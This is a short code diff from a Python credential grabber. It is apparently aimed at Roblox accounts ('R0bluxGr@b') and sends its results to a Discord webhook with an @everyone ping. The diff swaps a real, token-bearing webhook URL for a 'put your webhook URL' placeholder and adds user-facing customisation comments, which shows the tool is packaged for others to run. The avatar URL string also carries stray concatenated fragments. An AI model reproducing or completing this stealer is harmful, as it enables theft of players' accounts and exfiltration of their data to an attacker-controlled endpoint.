@@ -170,7 +170,7 @@ class SMTHGRB:
 
             "username": "R0bluxGr@b",
             "content": "@everyone",  # You can change this to be just no ping or a @here ping.
-            "avatar_url": "https://cdn.discordapp.com/avatars/924130884452511845/1d8a7d3f6bfe5bf654529724a3519d08?size=1024"
+            "avatar_url": "https://cdn.discordapp.com/avatars/924130884452511845/1d8a7d3f6bfe5bf654529724a3519d08?size=1024" # You can change the avatar if you are advanced in python.
                           "/latest?cb=20190801142211&path-prefix=fr"
                           ".png?size=1024",
             "embeds": self.embeds,
@@ -180,4 +180,4 @@ class SMTHGRB:
 
 
 
-SMTHGRB("https://discord.com/api/webhooks/1136110915633287168/KGksoQUmOgEf0O7UjTcmazjVQKhIoL7k8jrPIRSnvbOnVh_dP3cUVoEmCeEP8KnVFjgr")
+SMTHGRB("PUT YOUR WEBHOOK URL IN THE QUOTE")
